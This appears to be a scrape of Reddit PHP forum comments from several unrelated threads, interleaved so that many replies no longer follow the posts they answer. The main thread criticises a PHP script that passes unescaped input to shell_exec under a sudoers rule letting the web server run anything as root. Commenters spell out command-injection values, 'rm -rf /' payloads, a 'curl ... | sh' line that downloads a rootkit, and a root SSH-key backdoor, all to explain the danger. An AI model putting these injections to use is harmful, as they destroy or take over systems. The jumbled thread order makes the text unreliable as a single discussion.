 $cmd = "perl -e 'print crypt($password, \"salt\")'"; $encpass = shell_exec($cmd); 
It means someone could use a specially crafted input that would cause shell_exec to run commands other than what you intended. Or, more likely, is that someone will decide they want a character in their name, like a dash, or a semicolon, and it will cause the command to not work. You should do something like: $username = escapeshellarg($username); $encpass = escapeshellarg($encpass); Note that it isn't 100% necessary to escape the encoded password, but it is better to do it and be safe than not and have it bite you later on.
&gt; I have used a whoami and have confirmed that it runs as http. In /etc/sudoers I have &gt; http ALL=(ALL) NOPASSWD: ALL root ALL=(ALL) ALL %wheel ALL=(ALL) NOPASSWD: ALL %sudo ALL=(ALL) ALL &gt; &gt; I also added http to group wheel. Please don't do this. It's unnecessary and WILL bite you later, especially if this is public facing. Limit permissions to only what is needed. You can remove http from %wheel and use this line in sudoers instead: http ALL=(root) NOPASSWD: /sbin/useradd This allows user http to use only the `/sbin/useradd` command as root. If you need to add more commands, just append them to the line with commas: http ALL=(root) NOPASSWD: /sbin/useradd, /sbin/userdel NOTE: I'm guessing at the paths to the user utilities. I'm not on my linux box to confirm, and they may be different for Arch anyway. Take some time to read the [sudoers manual](http://www.sudo.ws/sudoers.man.html). It can be complicated, but it'll serve you well to learn it. There's no reason to open up such a huge security hole on a server, even if it's private; a bug or accidental bit of code could cause some serious damage to your system the way you have it now. It's best not to half-ass things and learn how to do it correctly right from the start, especially when it comes to security. Also, take a look at the [Symfony process component](http://symfony.com/doc/current/components/process.html). It's designed specifically to help developers run external processes from PHP as safely as possible.
Arch linux decided everything has to be in /usr so the correct paths are http ALL=(root) NOPASSWD: /usr/bin/useradd, /usr/bin/userdel
Holy shit.
https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-2-coding-style-guide.md
Have you got PHP_CodeSniffer installed? If not, go grab it (sudo pear install PHP_CodeSniffer) and set the default coding standard to PSR2 (phpcs --config-set PSR2). Assuming you're using some kind of version control; make your changes, commit them, then run 'phpcs -a --extensions=php .' to start sniffing your code. The --extensions tells CS to only sniff PHP files, the -a allows you to see the errors for the file currently being sniffed, you can then fix the problems and resniff by hitting enter. Once all of your files are clean, make a second commit. The thinking behind the two commits is: if you add a ton of functionality to an existing class, but then change (for example) the line endings from \r\n to \n it looks like the whole file was changed in a single commit, therefore you loose the ability to view code changes between commits in a diff, making debugging regressions that little bit harder
So I've gotten mostly answers for checking ; rm -rf / and things like that, so I've edited my code around to do that, but the main problem still stands. Why does it create the user correctly but not the password?
How are you sure the password is not set? Using the method to generate the salt in the comment thread, and using escaping when entering the salt as a password on an Arch Linux system, the code does set the password, and the user can be logged in.
The pluralize class is an exercise in futility. * It's only good for English * It's guaranteed to butcher a word when you least expect * It's likely missing some rules, and lots of irregulars &amp; uncountables * It's plain wrong in some cases (person =&gt; people, but "persons" is also correct, depending on context)
Is it the images or the pages you want to cache? If you have pages of images you should consider using nginx or a cdn to serve the images as they will speed up your site immensely. As for the pages, if they don't change you could make them static (HTML), if this isn't an option you'll need to provide more information about how your pages are being generated, such as are you using a framework and/or templating engine.
Caching on a per page basis only works if the pages don't change, it sounds like the pages change with every new image added in your case. You may not get much of a performance boost from caching, how long does it take to select 10 records from your database? Are you using a LIMIT clause? For a simple select like this I wouldn't even bother with caching.
I assumed it'd be a few milliseconds at most. No point caching for the sake of caching. Consider it if and when that ever becomes a bottleneck in my opinion.
This is some of the most dangerous code I've ever seen in my life.
I can echo out $encpass and I can use that in command line when creating the user and it is correct.
Consider using the Specification pattern to decouple the selection criterias out from the repositories and keep it them DRY. http://devlicio.us/blogs/casey/archive/2009/03/02/ddd-the-specification-pattern.aspx Hope that helps!
Can you pastebin the full code? Because I just ran this code exactly: &lt;?php // PS This code is bad and should never be used in real life or anything production $username = 'test'; $password = 'test'; $groupname = 'users'; $salt = strtr(base64_encode(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM)), '+', '.'); $encpass = crypt($password, '$6$rounds=5000$' . $salt . '$'); $result = shell_exec( sprintf( "sudo useradd -p %s -g %s -s /bin/bash %s", escapeshellarg($encpass), escapeshellarg($groupname), escapeshellarg($username) ) ); echo $result; I also added my user to sudoers as such: edward ALL=(root) NOPASSWD: /usr/bin/useradd, /usr/bin/userdel This worked correctly for me. Are you not getting any output from the command? Is it emitting any warnings? You may want to look into auth via RADIUS. You would insert the username and hash into a database, and have RADIUS check the database for authentication. You then have PAM check for authentication attempts with RADIUS. [Something like this](http://safesrv.net/setup-ssh-to-authenticate-off-freeradius-on-centos-6-3/)
You mean something like this? (In BaseRepository): (code not tested) public function get($id, array $related = null) { $class = get_class($this); if (substr($class, 0, 8) == 'Eloquent' &amp;&amp; substr($class, -10) == 'Repository') { $class = substr(substr($class, 8), 0, -10); } else { throw new Exception('You must implement get() in the subclass.'); } if(is_array($id)) { $value = $class::whereIn("id", $id)-&gt;get(); } else { $value = $class::findOrFail($id); } if(!is_null($related)) { $value-&gt;load($related); } return $value; } Also, instead of the get_class and string manipulation hack, you could set a protected property with the name of the item "Measurement" or "HardwareCategory", etc, and use that instead.
I haven't tried Laravel 4 yet but can't you use self::whereIn() and self::findOrFail() in the BaseRepository?
I just started a small project from scratch, no frameworks, only php and pdo. I´ll tell you this: I regret my decision. I ended up replicating a lot of Laravels functionalities, and that took time away from the actual app development. If you wanna learn, don´t use a framework, if you want to produce, use Laravel.
I'm guessing somewhere between $30k and $140k, depending on just about *everything*. Edit. Not trying to be snarky, but there are so many variables.
I mean it's on a closed network and just a few friends are using it so
If you're a decentish developer (not a beginner) at a decentish company, you probably shouldn't get less than $70k/year, I'm guesssing, as a starting point. That might be low for the SF area, if living costs are higher. That's just a WAG, BTW.
True enough, if you judge by average Craigslist offerings, it's about $600/yr, but massive equity in dozens of failed startups.
/bin is symlinked to /usr/bin iirc.
ionlysayha, for the love of god, please read this book before you do any more coding: http://shop.oreilly.com/product/9780596006563.do. This is horrible, horrible security. *Never* run untrusted code submitted to a web server, and certainly not with root privileges. Ever. In fact, don't ever run a public-facing network daemon with root privileges. Just don't. Sorry to be harsh, but if you leave security as an afterthought, you WILL get hacked.
I agree with you, and I'm aware of the security holes. But this isn't a publicly faced server, it's on a closed network. It has now become more frustrating as to why it doesn't work, I'm going to use a different method. 
Ah, and the new breed of **copy/paste** coders emerge...
Out of curiosity, but what inspired you to go this route? I've coded in PHP before, but not for awhile, so I'm not familiar with best practices...but is it a common/well-established pattern to add users to the server's operating system? Why don't you use a database-backed authentication system, or even simple http_auth? As others have pointed out, there are a few flaws with your implementation...but I'm interested in where you got the idea...Is it a recipe from somewhere?
I think it's a good idea. Do a query like *get latest 100 posts* and store it in whatever caching system you use. So when your server looks for one of the first 10 pages (assuming 10posts/page), it will fetch from that array. Then you can update that cache every new posts or every n minutes.
April 1st is long over, dude.
I seriously hope you're wrong.
This is the best troll ever.
NOTE: This is literally the second worst thing I've seen done, and the fact that you didn't know to filter or escape your input means you're a novice at PHP at _best_. This makes what you're doing a really bad idea. Period. Doesn't matter if this is "internal" to your network or not, this is an extremely bad idea. Period. You would even be better off writing a CGI that takes two parameters and creates the user...but even that...oh man. You deserve to have your computer, or a hand, smashed with a hammer. You must choose at least one. Now on to the tip. :) You should verify that encpass is actually receiving the full password string. If encpass is a callout to a shell command (you deserve both hands to be smashed with a hammer), then you should make sure the string is properly escaped so that encpass actually receives the full password supplied. Try a (so help me for saying this) simple password with only letters and numbers and see if that works? In closing...stop. If you refuse, you deserve something bad. If you still refuse, good for you, you should make sure the password hash generator is getting what you think you're sending to it. EDIT: For an example of how much of a joke what you're doing is, I give you XKCD. http://xkcd.com/327/
Well I need to have users added to the operating system, and I'd like that to be through a web browser. (Again this is on a closed network).
If you're saying Arch symlinks /bin to /usr/bin then Arch goes a long way to break FHS and LSB standards for starters. Even better, you don't necessarily have /usr mounted at boot. You tend to need binaries in /bin and /sbin to continue booting a Linux machine (try running "which mount" for a hint) after / has been mounted by the kernel or the initrd.
They definitely exist and can be accessed: &lt;?php $xml='&lt;?xml version="1.0" encoding="UTF-8" ?&gt; &lt;response uri="/crm/private/xml/Accounts/insertRecords"&gt;&lt;result&gt;&lt;message&gt;Record(s) added successfully&lt;/message&gt;&lt;recorddetail&gt;&lt;FL val="Id"&gt;928409000000079007&lt;/FL&gt;&lt;FL val="Created Time"&gt;2013-08-27 19:43:53&lt;/FL&gt;&lt;FL val="Modified Time"&gt;2013-08-27 19:43:53&lt;/FL&gt;&lt;FL val="Created By"&gt;&lt;![CDATA[Holness]]&gt;&lt;/FL&gt;&lt;FL val="Modified By"&gt;&lt;![CDATA[Holness]]&gt;&lt;/FL&gt;&lt;/recorddetail&gt;&lt;/result&gt;&lt;/response&gt;'; $responseXml = simplexml_load_string($xml); foreach ($responseXml-&gt;result-&gt;recorddetail-&gt;FL as $fl) { echo $fl['val'] . '&lt;br/&gt;'; } ?&gt; `Id` `Created Time ` `Modified Time` `Created By` `Modified By` You would reliably get the `Id` field by iterating over the FL fields, and checking `$fl['val']` as in the loop above. EDIT: Here's the docs you're looking for: http://php.net/manual/en/simplexmlelement.attributes.php &gt;Note: SimpleXML has made a rule of adding iterative properties to most methods. They cannot be viewed using var_dump() or anything else which can examine objects.
print_r() or var_dump does not always show the full structure with simplexml_load_string or SimpleXMLElement. You can retrieve attributes like the below code. $responseXml = simplexml_load_string($xml); foreach($responseXml-&gt;result-&gt;recorddetail-&gt;FL as $fl) { echo $fl-&gt;attributes()-&gt;val . '&lt;br /&gt;'; } 
Other comments lead me to believe that they were not sanitized inputs. But it is a presumption, yes.
Yes, that is the point of this.
It does. From my arch box: arch% ls -l total 52 lrwxrwxrwx 1 root root 7 May 31 18:40 bin -&gt; usr/bin drwxr-xr-x 3 root root 4096 Mar 29 01:04 boot drwxr-xr-x 15 root root 2920 Jun 17 00:18 dev drwxr-xr-x 50 root root 4096 Jul 30 04:20 etc Post explaining why: https://mailman.archlinux.org/pipermail/arch-dev-public/2012-March/022625.html Not only is /bin a link to /usr/bin, /sbin is also a link to /usr/bin, and /usr/sbin is also a link to /usr/bin. *Everything* now lives in /usr/bin on Arch. 
They are not incorrect.
`print_r` dumps from SimpleXML just don't work. You'll have to either specifically query the attribute: echo $responseXml-&gt;result-&gt;recorddetail-&gt;FL['val']."\n"; If you wanted a generic report on the XML structure, you could write a recursive function using the [`SimpleXMLElement::children()`](http://www.php.net/manual/en/simplexmlelement.children.php) and [`SimpleXMLElement::attributes()`](http://www.php.net/manual/en/simplexmlelement.attributes.php), like: function exploreXml(SimpleXmlElement $xml, $depth) { $tab = str_repeat("\t", $depth); echo $tab . "name: " . $xml-&gt;getName() . "\n"; $children = $xml-&gt;children(); $attributes = $xml-&gt;attributes(); if (count($children) == 0) { echo $tab . "value: " . $xml . "\n"; } if (count($attributes) &gt; 0) { echo $tab . "attributes:\n"; } $tab = str_repeat("\t", $depth + 1); foreach ($xml-&gt;attributes() as $att =&gt; $val) { echo $tab . "$att = $val\n"; } foreach ($children as $child) { exploreXml($child, $depth + 1); } } which results in name: response attributes: uri = /crm/private/xml/Accounts/insertRecords name: result name: message value: Record(s) added successfully name: recorddetail name: FL value: 923409003000074001 attributes: val = Id name: FL value: 2013-08-27 19:43:53 attributes: val = Created Time name: FL value: 2013-08-27 19:43:53 attributes: val = Modified Time name: FL value: Name attributes: val = Created By name: FL value: Name attributes: val = Modified By
Add a touch of `--no-preserve-root` and you have a really really dangerous stew going.
The fact that he's shell-exec'ing Perl to encrypt the password is proof enough that he's not the sort of person who would be sanitizing his shell inputs.
What's the first?
Fact
Arch is following Fedora in this matter. That way of booting is becoming archaic. Nowadays most of those binaries are needed in the initial ramdisk environment anyway. See https://fedoraproject.org/wiki/Features/UsrMove for reasoning.
There was a big long thread on the mailing list between the maintainers, lots of bickering, in the end though it was like 75% ish for migrating. Ulitmately though, it was determined that the difference between /usr/bin and /bin was useless and arbitrary, modern Linux lets you mount 2 different drives on /usr/bin if you really want a minimal boot system, that bootstraps up. As I recall, Arch has been putting LVM into the initial ramdisk if you need LVM pre-boot.
I meant that to be more sarcastic. Abusing the OP's misunderstanding of what is being allowed here.
IBM's declaration that the PC was a fad and would never catch on. If we're limiting the conversation to tech. Otherwise...genocide. This is a close second to genocide. 
He thinks this has to be directly on "the internet" to be compromised. It's funny.
I have googled it and I just get tutorials for contact forms that don't have the same design. How would I make this form function, as it appears with the same design? Thank you!
Sweet wwebsite as on the internet. 
configure your php mail or use swift smtp transport
&gt;I've gotten mostly answers for checking ; rm -rf / and things like that, so I've edited my code around to do that It's ok guys. He checks "; rm -rf /". Crisis averted.
Sorry on my ipad right before bed when I saw you post. That being said I can't see how you are handling sending the data. I submitted a test on the form it looks as though you are posting to the same page. So the easy answer is some php script at the top of the page with a if($_POST) { Mail(); } Provided that is what you are trying to do and your host allows sending the email. Other option are Ajax sends if you want to do something fancy with a js event scripting thing. If you are trying to store it in a database then just put your db insert scripts instead of the mail() script. Sorry kind of sleepy so gunfight all
here's a really rough, ugly, but easy version to get u started - change this to a php document - add name="name", name="email", name="comment" to each input element and textarea respectively - change submit button to &lt;input type="submit" name="submit" value="Send a Message!" /&gt; - add enctype="multipart/form-data" to your &lt;form&gt; tag - add this code to the top of the document before &lt;!DOCTYPE&gt; and &lt;HTML&gt;: --- &lt;?php if($_POST['submit'] != ''){ $name = $_POST['name']; $email = $_POST['email']; $comment = $_POST['comment']; echo 'Thank you ' . $name . ' for your comment:&lt;br /&gt;' . $comment; // here you can set up a mailer, etc using your variables } ?&gt; ---- That'll get you started. Now you have your variables
Actually this makes lot of sense http://www.freedesktop.org/wiki/Software/systemd/separate-usr-is-broken/
sweet baby lord mother of jesus HTTP root PHP batman ok but joke aside, everyone is pointing how insecure this is, but not many people have elaborated on alternatives. how do you suggest he should do it (as a web application)? 
LOL! it reminded me of this XKCD strip: http://xkcd.com/327/
Thanks for this post. That's what i thought. In addition: A good PHP developer is able to adapt the standard patterns utilizing the unique capabilities of PHP. PHP is a tool, if you know your tool right you can make the best out of it. In addition, i think PHP is one of those language which encourage creative design solutions (not dirty ones), instead of being conservative. This, connected with a strong base, makes a good PHP dev. For the actual question of our poster: You should stop using Yii and CodeIgniter and take the knowledge you got from using this frameworks and start making and implementing your own designs. It's a thing understanding an design and / or architecture, it's another thing to be able to create your own, based on the requirements of an actual customer. I'm not saying that you shouldn't use Yii or CodeIgniter, but that it's a valuable part of being a developer to learn how to craft something from scratch. This experiene will enable you view the stuff you did differently. Book recommendation: The Pragmatic Programmer. It's also not a "PHP book", but it basically shows you the basics in becoming a "Master Craftsman". Also, the book goes beyond the coding part - which is only 50% of the job - because it's not only important to know how to code, but also how to think, how to work in teams and how to approach problems and sometimes stressful situations.
Somebody give me a brief explanation about what's going on in here. I'm a bash noob.
It allows block editing though (hold ALT while selecting text with the mouse).
i'm seriously upvoting every one of your responses. this is too good.
/bin is intended for the binaries owned by the OS /usr/bin is intended for the binaries owned by non-OS software Same for sbin directories, except those are meant for superuser use.
http://i.imgur.com/TaTdV.gif
My preferred username would be: ; sudo rm -fr /
Wouldn't it still delete all files that the http user has write access for?
Is that how they use rm in France?
Why actively update the page cache? Just let it expire after some time. Your visitors probably won't notice if the page only changes every 60 or 300 seconds. If authenticated users have to see changes immediately, let them bypass caching. If you set this up with something like Varnish, you don't even have to fire up PHP to handle most requests.
indeed, AND, since "http ALL=(ALL) NOPASSWD: ALL" this is in the sudoers file, apache has write access to nearly _every_ fucking file on the system.
I hope you have good friends..
Surely in this case "never trust your web developer"?
This is like leaving your car unlocked because you're in a private car park. Sure, normal people aren't going to be in your car park so it's not a problem but what if someone *is*? or someone with access to your private car park has decided to be an asshole? what if you go to park in a public car park and forget "oh, this is a public car park" and leave your door unlocked? Doing it this way is **insanity** regardless of how secure your network is. Something is only as strong as your weakest point: this code could be used to root your server.
salt=salt is the new password=password?
&gt; it's on a closed network You're saying it's on a network with no connection to the internet whatsoever? Also that everyone who has anything to do with that network knows to never connect it to the internet in any way?
&gt; That's nice and all, but it's a rather meaningless distinction in most Linux distributions, including Arch. Everything is managed by the package manager, so it's all "owned" by the OS in the sense that the OS manages them. And the sbin vs. bin is also rather pointless, since all users typically have access to both directories. The only thing those splits do is force me to run whereis whenever I need an absolute path to a binary. True, but that wasn't the case when the OSes and everything after them was compiled from scratch, and often configured down to machine specifics. There used to be a time where people thought tweaking .h files in the OS kernel source for every machine is a good idea. &gt; The OS/non-OS distinction probably means more in a system like FreeBSD where the OS is distributed as a unified collection of tools and programs. In most Linux distributions, though, the OS simply contains the package manager and maybe the init system. Well, yes, it's high time to rid of this legacy, but in practice this means that standards are going to be violated and a lot of stuff will break. I personally loved the BeOS/AtheOS/Syllable approach where the application can be a zip file that you can run. 
It's because Swiftmailer is trying to connect to mail.nearlyfreespeech.net to send your mail but your ISP is probably blocking connections to port 25. This is very common as is helps prevent malware from sending spam emails. If you have a local SMTP server you can use, you could do: // Create the Transport $transport = Swift_SmtpTransport::newInstance('smtp.myisp.com', 25); // Create the Mailer using your created Transport $mailer = Swift_Mailer::newInstance($transport); 
Why do you even want to do that? I can't think of any good reason to have a web-server create a new OS user. 
If I entered my password as `x &amp;&amp; sudo rm -rf / #` Your entire server would vanish.
thank god he's using super secure unix!! He'd be rocking administrator@asdf.local account with xampp
well, learn to use the [facebook api](https://developers.facebook.com/docs/php/gettingstarted/). they have a lot of examples there. i think, you can red, don't you?
How are you generating the password?
"remove all of france"?
But then the shell would ask for your password and...do nothing.
No no no. This is beyond hope. Walk away slowly. 
&gt;This is like leaving your car unlocked because you're in a private car park. And running. With the doors open. 
Well, that's very unlikely. I mean come on, not even Bobby Tables is named *that*.
What is your test URL? I will give a demo.
 I'm sorry, I only know how to *green*.
oh sorry, my bad.
&gt; but if you're dead set on it What if I'm not? Where should I start to get some experience and such?
Bro, you just blue the opportunity to make an Arrested Development joke. 
Never trust managements hiring methods.
The problems are: 1. `sudoers` has been set up so that PHP can execute any command as root. 2. The expression `shell_exec("sudo useradd -p $encpass -g groupname -s /bin/bash $username");` Suppose you make a new user on the site, by typing "`password`" in the password field, and "`fred; sudo malicious_command`" in the username box. Then sudo useradd -p $encpass -g groupname -s /bin/bash $username expands to sudo useradd -p LlmKkt0I4LZBo -g groupname -s /bin/bash fred; sudo malicious_command The semicolon is essentially a command separator in sh, so that is exactly equivalent to sudo useradd -p LlmKkt0I4LZBo -g groupname -s /bin/bash fred sudo malicious_command A user called "fred" will be created, and then, since `sudoers` is set up to permit *anything*, `malicious_command` will be executed as root. You could replace `malicious_command` with `rm -rf /` to destroy the system, or `curl http://foo.bar/path/to/my_rootkit | sh` to download and execute a remote access tool. EDIT: I missed the actual question. This post assumes that he actually encrypted the password, but the problem could well be that he's doing sudo useradd -p password -g groupname -s /bin/bash fred instead of sudo useradd -p LlmKkt0I4LZBo -g groupname -s /bin/bash fred , in which case the exploit would still work, but the user creation would not.
&gt; http ALL=(ALL) NOPASSWD: ALL Means that sudo will not ask for a password.
I use -fr instead of -rf because I read it as "remove FoRcefully" :)
&gt; "http ALL=(ALL) NOPASSWD: ALL" Translates to: For the http user; Allow from any host; Allow http to impersonate any user. Do not prompt for a password when running any commands... so no, it wouldn't prompt for a password. Edit: Clarified a bit more. 
You want `sudo rm -fr /*` or `sudo rm -rf --no-preserve-root /`
Giving unrestricted access to `useradd` allows that user to create a new root user (uid 0). So it's still a bad idea...
Germany is not in the sudoers group. This incident will be reported.
Why should Linux seek compliance with hopelessly outdated standards?
 from root.
http://stream1.gifsoup.com/view5/2283491/goggles-do-nothing-o.gif
shit it's been a while since i've heard that reference.
Looks like a fantastic library, but it also seems to have no microseconds capabilities like the OP is looking for.
Not quite, useradd requires a unique uid, however, using -G lets you specify what groups to be part of so might as well add yourself to root and wheel then just remote connect yourself and sudo to root. Edit: I missed the -o option so yes, -o -u 0 would work.
Yeah about that, people who are infamous for breaking userspace to the point where the kernel devs have to intervene aren't really in a position to be calling Unix design broken.
My os didn't disappear I just wanted a fresh install. 
Little bobby tables? 
Jimmies Status: Russel Crowe'd
Doesn't really matter... --no-preserve-root do not treat ‘/’ specially (the default)
I commend you for using the repository pattern, friend. It is a staple of domain-driven design and good architecture. Though it may not be obvious, what you are running into here is a limitation of Laravel's decision to expose the bulk of its functionality as static methods. See how it wants you to do this: Measurement::findOrFail($id); ...instead of this: $measurement = new Measurement(); $measurement-&gt;findOrFail($id); That's the problem. Using static methods, your code must *always know* what class it's dealing with, meaning you have to write one repository that calls the "findOrFail" static method on the Measurement class, and one that calls it on the HardwareCategory class, and one that calls it on WhateverOther class, etc... That is the problem you are currently facing, right? If we were dealing with object instances instead, it'd be possible for you to do something like the following: abstract class BaseRepository { /** @return BaseModel */ abstract function getModel(); public function get($id, array $related = null) { $model = $this-&gt;getModel(); if(is_array($id)) { $model-&gt;whereIn("id", $id)-&gt;get(); } // ... return $model; } } class MeasurementRepository extends BaseRepository { public function getModel() { return new Measurement(); } } See the difference? In the example above, the base repository -- which does the bulk of the work -- *does not need to know or even care* what type of object it's working with, as long as it extends "BaseModel". [This is what object-oriented programming is all about](http://en.wikipedia.org/wiki/Liskov_substitution_principle_), and this is impossible with static methods. This is why static methods are often frowned upon -- they make it impossible to "inject" an object as a parameter (which in turn makes them harder to unit test). So why doesn't the Laravel guy understand this? Well, obviously, he does. [Take a look at this snippet of Eloquent code](http://laravel.com/api/source-class-Illuminate.Database.Eloquent.Model.html#380-397). See what's going on there? In that static "find" method, under the hood, in the somewhat confusing line that reads "$instance = new static", he is actually instantiating an object and working with it. His having the bulk of the actual functionality implemented as *non*-static members is almost certainly because of the problems I mentioned above; it's just best architecture practice. OK, so if the Laravel guy obviously understands the limitations of doing everything static, and in fact *doesn't* do everything static himself, why on earth does he wrap up Eloquent's functionality in these static methods, basically imposing these limitations upon the user? So here's the thing. Laravel is trying to make it easy for you. And though I would disagree, I assume the author feels that these "static facades" make it easier for you to use the framework. It's trying to eliminate the need to create your own repositories at all. Eloquent is meant for you to pepper things like "Measurement::find()" all throughout your application, and not wrap it in a repository of your own. You're not meant to get that fancy because Laravel, like most frameworks, will do the heavy lifting for you, on the assumption that you're willing to sacrifice flexibility for convenience. Is this acceptable? That's up to you. IMO, it depends on the size of your project. If this is some rinky-dink little one-off web site, then Eloquent it up all the way. If it's a larger project that you'll be maintaining for a long time and you don't want to tie yourself too strongly to a single framework, then I'd recommend sticking with your repository approach but also abandoning Eloquent and making your own POPO models instead. Laravel's fluent query builder is quite nice, and could be what your repository relies on to get the job done. If you do decide to stick with the combination of Eloquent plus your own repositories, ask yourself two questions: 1) Have I basically just re-implemented Eloquent's "find()" method in my own repository and, if so, what's the advantage? 2) If all of my models extend Eloquent\Model, what is the advantage of writing my own repositories if I'm already tied to Eloquent anyway?
SwiftMailer is using mail() as expected. However, mail() is passing off to sendmail which is tossing an error because it cannot connect to the configured relay. Thus the error you've received: `sendmail: Cannot open mail.nearlyfreespeech.net:25`. Either the relay is down, you have a firewall blocking access to the relay, or there's a broken network connection somewhere. If you have root access (not familiar with this host), check your firewall. Otherwise (or if you feel your firewall is correct) submit a ticket to your host about the issue. 
This is correct if and only if op is running this code locally and not on the hosting account. Otherwise, see my comment. 
You forgot --no-preserve-root
Your mail server may require connection on another port and with another security and authentication prerequisite. Ask the host and configure SwiftMailer transport accordingly
Oh lord.
everything except france*
If you're seriously in need of creating users and/or groups on a linux system, I would recommend you not re-invent the wheel. [Webmin](http://www.webmin.com/index.html) has a module for [creating users and groups](http://doxfer.com/Webmin/UsersAndGroups) on the system.
this video represents my comment, http://youtu.be/kxRX6LXDpWs
holy shit indeed.... a sudo?!?!?
To be fair, you don't know whether he is sanitizing the username and password. It could be sanitized, maybe the line before the one we are seeing check whether username and password only contain lowercase characters a-z.
This kind of thing makes me want a mandatory computer programming licence
The mixing of camelCase and under_score has been brought up before. The reason for that mix up is that originally I was using under_score and then the PHP room on StackOverflow let me know to switch to camelCase.... but I was too lazy to switch my old code (which I should do)
What is this, shell scripting for France?
&gt; This incident will be reported Every time I see that I think the FBI is about to bust in and arrest me. 
He'll never see Mr. bob &amp;&amp; rm -rf / coming
Holy fuck.
You typed this twice. And it was wrong both times, haha :p
Everyone knows production is web scale.
Are you fucking kidding me? I hope this is in a personal project and not something in production.
30 seconds? :) Running composer install on fresh laravel 4 project surely takes much longer than that... I'm still learning Laravel 4 though, any subreddit with Laravel specific discussion?
What is this, a joke that's already been said hours ago?
I can't even cloud
Just to be clear: I didn't mean to criticize the implementation of Eloquent, just that I don't like the static facades via which it (and most Laravel components) expose their functionality. If you are on-board with the framework and doing it all the Laravel way, then the static facades are a non-issue.
--no-preserve-root does not treat '/'
Ehhh.... I do not really agree with you on that point.
Is there any error message at all? When you say it fails, what happens? Error? Blank? Wrong value? It's possible $post is being replaced by the code running in the shortcode somehow?
Why is it stupid and/or wrong? What's so great about POSIX compliance anyway?
OP replies in a comment that he's not sanitizing his input. Eek.
I always think of it as FuckingRemove, because every damned time I try rmdir there is always some little annoying empty hidden file left there for no reason what so ever.
That's a link to some standards. They don't explain at all **why** it's so important that everyone follows Their One Standard. Which it isn't, by the way.
Do you even cloud?
Depends, some ditros do require it (e.g. Ubuntu)
He runs Arch Linux (another dumb choice for a goddamn server), so he has GNU rm, so `rm -rf --no-preserve-root /`
depends on your implementation, OP uses GNU rm with Arch Linux which has `--preserve-root` as default.
You shouldn't be frustrated it doesn't work, you should be glad. Do it the right way, your method is full retard.
Besides the rm -rf / everyone else is talking about, how about a little : sudo echo MY-KEY-HERE &gt;&gt; /root/.ssh/authorized_keys ?
First of all: Why do you need to create a unix user account for each user? Is that actually necessary? Sanitising the input for the username IS JUST THE START when it comes to preventing malicious attacks. If you're offering some application as a service, you'd probably be better with Linux containers (i.e. [Docker](http://www.docker.io/).) That way you don't really have to give two damns about what the user does if he gains root access -- he's locked in the container he was given! Being a newbie is fun. You're naive enough to move fast and break things without getting dragged down by pesky details. But you also know *just enough* to be dangerous; this appears to be one of those times. Keep playing with things…just try not to put your users at risk! To answer your question though: I had a similar issue setting the password for a new user account a while back (though I wasn't creating it with untrusted user input!!) This is how I solved it: &gt; sudo useradd -g #{group} -s /bin/bash #{user} &gt; echo '#{user}:#{password}' | sudo chpasswd Note `chpasswd` actually accepts the password as plaintext here and encrypts it itself. What are you trying to build, if you don't mind me asking?
Hahaha. Are you being serious right now? Even `sudo rm -rf /usr` will cause headaches.
&gt;then a fairly ordinary old-fashioned package manager managing packages inside `/usr/local` for you. Wait, then where are you supposed to stick non-managed binaries? `/opt`?
where does one buy a production?